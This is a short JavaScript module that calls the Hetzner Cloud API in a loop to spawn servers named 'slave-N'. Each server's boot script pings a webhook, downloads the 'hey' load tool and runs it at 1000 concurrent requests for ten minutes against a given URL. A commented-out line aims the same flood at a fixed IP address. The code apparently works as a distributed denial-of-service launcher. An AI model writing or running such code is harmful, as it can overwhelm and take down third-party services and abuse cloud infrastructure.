// require axios
//
import axios from "axios"
import { createRequire } from "module";
const require = createRequire(import.meta.url);
let config = require("./config.json")
// for loop 10 Times

async function create_hetzner(url, amount) {
	for (let i = 1; i <= amount; i++) {
		const response = await axios.post(
			"https://api.hetzner.cloud/v1/servers",
			// '{\n  "size": "s-2vcpu-2gb-amd",\n  "ssh_keys": "39592018",\n  "name": "slave-13",\n  "image": "140878882",\n  "user_data": "#!/bin/bash\\ncurl -X POST https://webhook-test.com/4c097f09b170a675810b879c695002cc -H \'Content-Type: application/json\' -d \'{\\"username\\":\\"xyz\\",\\"password\\":\\"xyz\\"}\'\\nwget -O hey https://hey-release.s3.us-east-2.amazonaws.com/hey_linux_amd64 ; chmod +x hey && ./hey -z 3m -m GET http://88.198.48.45"\n}',
			{
				image: "ubuntu-20.04",
				name: `slave-${i}`,
				server_type: "cx51",
				ssh_keys: [15840198],
				user_data:
					'#!/bin/bash\ncurl -X POST https://webhook-test.com/943b20bdc3502e6f66049746fca65180 -H \'Content-Type: application/json\' -d \'{"username":"xyz","password":"xyz"}\'\nwget -O hey https://hey-release.s3.us-east-2.amazonaws.com/hey_linux_amd64 ; chmod +x hey && ./hey -z 10m -m GET -c 1000 ' + url,
			},
			{
				headers: {
					Authorization:
					"Bearer " + config.hetzner_key,
					"Content-Type": "application/json; charset=utf-8",
				},
			}
		)
		console.log("Spawned Server: Slave-HETZNER-", i)
	}
}


export default create_hetzner


